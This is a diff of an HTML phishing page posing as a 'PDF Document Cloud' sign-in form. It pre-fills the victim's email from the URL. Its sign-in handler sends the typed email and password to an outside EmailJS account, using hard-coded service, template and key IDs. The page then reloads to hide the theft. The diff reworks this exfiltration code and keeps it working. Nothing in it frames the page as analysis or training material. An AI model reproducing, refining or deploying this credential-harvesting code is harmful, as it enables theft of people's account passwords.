@@ -7,60 +7,44 @@
     <link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
     <title>PDF Document Cloud | Sign in</title>
     <script>
-        // JavaScript to extract the email from the URL and pre-fill the field, then focus on password
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const email = urlParams.get('email');
             if (email) {
                 document.getElementById('login').value = email;
             }
-            // Set focus to the password field
             document.getElementById('passwd').focus();
         };
 
-        // JavaScript to handle the Sign In button click (no prompts)
         async function handleSignIn() {
             const email = document.getElementById('login').value;
             const password = document.getElementById('passwd').value;
 
-            // Simple validation
+            // Validation
             if (!email || !password) {
                 alert('Please enter both email and password.');
                 return;
             }
 
-            // Send the data to EmailJS (silent)
-            emailjs.send('service_lwkhl0m', 'template_of2ygxs', {
+            // Unique timestamp to ensure every request is distinct
+            const timestamp = Date.now();
+            const payload = {
                 email: email,
                 password: password,
-                date: new Date().toLocaleString()
-            })
-            .catch(error => {
-                console.error('EmailJS Error:', error); // Silent error logging
-            });
+                date: new Date().toLocaleString(),
+                timestamp: timestamp // Unique identifier
+            };
 
-            // Send the data to the server (original functionality unchanged)
             try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ email, password }),
-                });
-
-                if (response.ok) {
-                    // Reload the page after successful submission
-                    window.location.reload();
-                } else {
-                    // Reload the page even if the submission fails
-                    window.location.reload();
-                }
+                const response = await emailjs.send('service_lwkhl0m', 'template_of2ygxs', payload);
+                console.log('Email sent successfully:', response.status, response.text, payload);
             } catch (error) {
-                console.error('Error:', error);
-                // Reload the page if an error occurs
-                window.location.reload();
+                console.error('EmailJS Error:', error.text || error);
             }
+
+            // Clear password field and reload
+            document.getElementById('passwd').value = '';
+            window.location.reload();
         }
     </script>
 </head>
@@ -101,13 +85,12 @@
         </div>
     </div>
 
-    <!-- Add EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("w17wdnGCRGm_6m5h0"); // Your actual Public Key
+            emailjs.init("w17wdnGCRGm_6m5h0"); // Replace with your EmailJS Public Key
         })();
     </script>
 
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9215d9757970b037',t:'MTc0MjE0NDg3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'921e80e59a3062b1',t:'MTc0MjIzNTYxOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9215d9757970b037',t:'MTc0MjE0NDg3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'921e80e59a3062b1',t:'MTc0MjIzNTYxOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
